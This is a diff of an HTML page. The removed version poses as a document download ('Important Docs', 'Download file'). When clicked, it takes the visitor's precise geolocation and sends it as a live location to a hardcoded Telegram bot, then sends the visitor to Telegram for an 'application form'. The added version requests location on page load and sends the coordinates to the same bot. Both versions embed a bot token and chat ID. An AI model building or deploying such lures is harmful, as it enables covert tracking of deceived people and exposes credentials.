@@ -1,200 +1,98 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Important Docs</title>
-    <style>
-        body {
-            font-family: Tahoma, sans-serif;
-            margin: 20px;
-            padding: 20px;
-            background-color: #f4f4f9;
-            color: #333;
-            text-align: center;
-        }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            background-color: #fff;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-        h1 {
-            color: #007bff;
-        }
-        p {
-            line-height: 1.6;
-        }
-        #sendLocationButton {
-            background-color: #28a745;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 18px;
-            border-radius: 5px;
-            cursor: pointer;
-            margin-top: 15px;
-            transition: background-color 0.3s;
-        }
-        #sendLocationButton:hover:not(:disabled) {
-            background-color: #218838;
-        }
-        #sendLocationButton:disabled {
-            background-color: #90a4ae;
-            cursor: not-allowed;
-        }
-        #message {
-            margin-top: 30px;
-            padding: 15px;
-            border-radius: 5px;
-            text-align: right;
-            border: 1px solid #ccc;
-        }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-            border-color: #c3e6cb;
-        }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border-color: #f5c6cb;
-        }
-        .info {
-            background-color: #e2e3e5;
-            color: #383d41;
-            border-color: #d6d8db;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send Location to Telegram</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+/* GPS spinning animation */
+@keyframes spin {
+  0% { transform: rotate(0deg);}
+  100% { transform: rotate(360deg);}
+}
+.spinner {
+  animation: spin 1s linear infinite;
+}
+
+/* Fade-in animation for the button */
+.fade-in {
+  opacity: 0;
+  transform: translateY(20px);
+  animation: fadeInUp 0.8s forwards;
+}
+@keyframes fadeInUp {
+  to { opacity: 1; transform: translateY(0);}
+}
+</style>
 </head>
-<body>
-
-    <div class="container">
-        <h1>Countinue</h1> 
-
-        <p>
-            For receive your docs click bellow and feel the form & send the form to Telgram page. @location904411_Bot
-        </p>
-
-        <button id="sendLocationButton">Download file</button>
-
-        <div id="message" class="info">
-           Next
-        </div>
+<body class="bg-gradient-to-r from-blue-400 via-purple-500 to-pink-500 h-screen flex items-center justify-center font-sans">
+<div class="bg-white rounded-3xl shadow-2xl p-10 w-full max-w-md text-center">
+    <h1 class="text-2xl font-bold mb-4">Please Enable Your Location</h1>
+    <div id="status" class="text-gray-700 mb-6 flex justify-center items-center">
+        <svg class="spinner w-8 h-8 mr-2 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="10" stroke-width="4" stroke-linecap="round"></circle>
+        </svg>
+        Waiting for location...
     </div>
+    <button id="sendLocation" class="fade-in bg-blue-600 hover:bg-blue-700 text-white px-6 py-3 rounded-full shadow-lg transition-all duration-300" style="display:none;">
+        Send Location to Telegram
+    </button>
+</div>
 
-    <script>
-        // 🚨 هشدار امنیتی: این توکن در مرورگر کاربر قابل مشاهده است. در محیط تولید، از یک سرور واسط استفاده کنید.
-        const TELEGRAM_TOKEN = '7851461640:AAFsqqe9niiYzPRuAZl3qK22e8aX3ZdJk4k';
-        const CHAT_ID = '7570861617';
-        const BOT_USERNAME = '@location904411_Bot';
+<script>
+const BOT_TOKEN = "7851461640:AAFsqqe9niiYzPRuAZl3qK22e8aX3ZdJk4k";
+const CHAT_ID = "7570861617";
 
-        document.getElementById('sendLocationButton').addEventListener('click', function() {
-            const messageElement = document.getElementById('message');
-            const button = this;
+function showError(message){
+    document.getElementById("status").innerHTML = <span class="text-red-500 font-semibold">${message}</span>;
+}
 
-            messageElement.textContent = 'Download Progress...';
-            messageElement.className = 'info';
-            button.disabled = true; 
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    // تابع موفقیت (Success)
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        
-                        messageElement.textContent = مکان (${lat.toFixed(6)}, ${lon.toFixed(6)}) دریافت شد. در حال ارسال به تلگرام...;
-                        
-                        sendLocationToTelegram(lat, lon)
-                            .then(response => {
-                                button.disabled = false;
-                                if (response.ok) {
-                                    // نمایش پیام نهایی به کاربر
-                                    const finalMessage = `
-                                    ✅ *Successfully registered.
-                                    <br><br>
-                                  You will receive your document in 24 houre befor that please send us application form in our official telgram.
-                                    <br><br>
-                                  Thank you
-                                    <br>
-                                    <a href="https://t.me/${BOT_USERNAME.substring(1)}" target="_blank">${BOT_USERNAME}</a>
-                                    `;
-                                    
-                                    messageElement.innerHTML = finalMessage;
-                                    messageElement.className = 'success';
-                                } else {
-                                    console.error('Telegram API Error:', response);
-                                    messageElement.textContent = ❌Error to match: ${response.description || ' Unkown error.'};
-                                    messageElement.className = 'error';
-                                }
-                            })
-                            .catch(error => {
-                                button.disabled = false;
-                                console.error('Network Error:', error);
-                                messageElement.textContent = '❌ Network connection filed.';
-                                messageElement.className = 'error';
-                            });
-                    },
-                    
-                    // تابع خطا (Error)
-                    (error) => {
-                        button.disabled = false;
-                        let errorMessage = '❌ *خطا در دریافت مکان:* ';
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED:
-                                errorMessage += "Applicant not agree in this rules.";
-                                break;
-                            case error.POSITION_UNAVAILABLE:
-                                errorMessage += "wifi or network connection filed.";
-                                break;
-                            case error.TIMEOUT:
-                                errorMessage += "Timeout.";
-                                break;
-                            default:
-                                errorMessage += "Unkown error";
-                                break;
-                        }
-                        messageElement.textContent = errorMessage;
-                        messageElement.className = 'error';
-                    },
-                    
-                    // گزینه‌های پیکربندی Geolacation
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
-                );
-            } else {
-                button.disabled = false;
-                messageElement.textContent = "❌ You browser not spported Try it in deferint browser.";
-                messageElement.className = 'error';
-            }
-        });
-
-        // تابع ارسال مختصات به API تلگرام با استفاده از متد sendLocation
-        async function sendLocationToTelegram(latitude, longitude) {
-            const url = https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation;
-            
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    latitude: latitude,
-                    longitude: longitude,
-                    live_period: 500 // ارسال به عنوان یک مکان لایو موقت (500 ثانیه)
-                })
-            });
-            
-            return response.json(); 
+function sendLocationToTelegram(lat, lon) {
+    fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: 📍 User Location:\nLatitude: ${lat}\nLongitude: ${lon}
+        })
+    }).then(res => {
+        if(res.ok){
+            document.getElementById("status").innerHTML = "✅ Location sent successfully!";
+            document.getElementById("sendLocation").style.display = "none";
+        } else {
+            showError("Error sending location! Please try again.");
         }
-    </script>
+    }).catch(err => showError("Error: " + err));
+}
 
+function requestLocation() {
+    if(!navigator.geolocation){
+        showError("Geolocation is not supported by your browser!");
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            document.getElementById("status").innerHTML = "📍 Location ready to send.";
+            const btn = document.getElementById("sendLocation");
+            btn.style.display = "inline-block";
+            btn.onclick = () => sendLocationToTelegram(lat, lon);
+        },
+        error => {
+            if(error.code === error.PERMISSION_DENIED){
+                showError("Please enable location access to continue.");
+            } else {
+                showError("Error getting location: " + error.message);
+            }
+        }
+    );
+}
+
+// Request location on page load
+requestLocation();
+</script>
 </body>
 </html>
